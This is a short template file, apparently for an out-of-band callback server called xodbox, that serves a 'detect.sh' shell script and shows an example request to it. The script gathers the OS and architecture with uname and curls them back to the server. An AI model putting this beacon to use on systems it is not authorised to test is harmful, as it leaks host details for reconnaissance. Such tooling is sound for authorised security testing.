---
title: Detect platform
description: detect platform
weight: 1
pattern: /detect.sh$
is_final: true
data:
  headers:
    Content-Type: text/plain
  body: |
    OS=$(uname)
    ARCH=$(uname -m)
    curl {{.Request.Host}}/{{ .NotifyString }}/$OS/$ARCH
---

### Example Request

```bash
curl -i "http://xodbox.test/detect.sh"
```

This will curl the notification url with the detected values in the path.
